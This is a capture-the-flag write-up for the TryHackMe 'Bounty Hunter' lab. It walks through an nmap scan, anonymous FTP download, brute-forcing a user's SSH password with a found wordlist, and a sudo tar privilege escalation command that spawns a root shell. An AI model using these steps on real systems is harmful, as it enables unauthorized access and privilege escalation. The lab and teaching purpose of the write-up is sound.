# Bounty Hunter | Tryhackme

***
## Difficulty = Easy
***

## **Nmap Scan**  


Running our nmap scan we have :

```powershell
# Nmap 7.94 scan initiated Fri Sep 22 14:18:11 2023 as: nmap -p- -sVC -T4 --min-rate=1000 -v -oN nmap.txt 10.10.163.201
Warning: 10.10.163.201 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.163.201
Host is up (0.15s latency).
Not shown: 55625 filtered tcp ports (no-response), 9907 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.60.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 22 14:25:12 2023 -- 1 IP address (1 host up) scanned in 420.37 seconds
```



## **FTP Enumeration**

- Nmap already told us we have two files here so we can download them with the following command :

```powershell
$ wget -m --no-passive ftp://anonymous:anonymous@10.10.163.201
```


- We can then Navigate to the `10.10.163.201` Folder, to enumerate further.

![](https://i.imgur.com/X0WLZ0u.png)


- We have a task from `lin` and some kind of wordlist from `locks.txt` , we can try bruteforcing these

![](https://i.imgur.com/AFlHMgU.png)



## **Foot Hold**

We where able to bruteforce the password of  `lin` with the given `locks.txt`

![](https://i.imgur.com/e3UDuq0.png)


We can then login and get our shell as `lin` and get the flag in the `user.txt` file.

![](https://i.imgur.com/ctzc6Dk.png)


## **Privilege Escalation**

The first thing i do if i get a user that isn't `www-data` is run `sudo -l` to show what commands i can run with **sudo** privileges

- Over here we can run `sudo -l` and as we can see we have permissions to run `/bin/tar`
- That is we can get root using `/bin/tar`

![](https://i.imgur.com/lUCC8cy.png)


- Nice, So, using the payload as shown below, you should be root 🤗

```powershell
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```


![](https://i.imgur.com/mNHHbgr.png)

Have fun 🥳


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>


